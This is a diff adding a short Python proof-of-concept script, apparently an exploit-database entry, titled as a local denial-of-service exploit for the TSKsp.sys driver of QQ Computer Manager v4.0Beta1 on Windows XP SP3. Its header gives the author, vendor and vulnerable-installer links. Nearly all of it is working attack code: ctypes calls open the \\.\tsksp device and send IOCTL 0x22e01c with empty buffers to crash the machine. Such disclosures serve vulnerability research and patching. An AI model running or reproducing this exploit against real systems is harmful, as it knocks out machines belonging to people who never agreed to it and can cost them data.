@@ -1,0 +1,31 @@
+#!/usr/bin/python
+
+#################################################################
+#
+# Title: QQ Computer Manager TSKsp.sys Local Denial of Service Exploit
+# Author: Lufeng Li of Neusoft Corporation
+# Vendor: http://pcmgr.qq.com
+# Vulnerable App: http://dl_dir2.qq.com/invc/qqmaster/setup/QQPCMgr_Setup.exe
+# Platform: Windows XPSP3 Chinese Simplified
+# Tested: QQpcmgr v4.0Beta1
+# Vulnerable: QQpcmgr<=v4.0Beta1
+# 
+#################################################################
+from ctypes import *
+
+kernel32 = windll.kernel32
+Psapi    = windll.Psapi
+
+if __name__ == '__main__':
+    GENERIC_READ  = 0x80000000
+    GENERIC_WRITE = 0x40000000
+    OPEN_EXISTING = 0x3
+    CREATE_ALWAYS = 0x2
+
+    DEVICE_NAME   = "\\\\.\\tsksp"
+    dwReturn      = c_ulong()
+    out_data      = ''
+    in_data       = ''
+    driver_handle1 = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
+						0, None, CREATE_ALWAYS, 0, None)
+    dev_ioctl = kernel32.DeviceIoControl(driver_handle1, 0x22e01c, in_data,0, out_data, 0,byref(dwReturn), None)
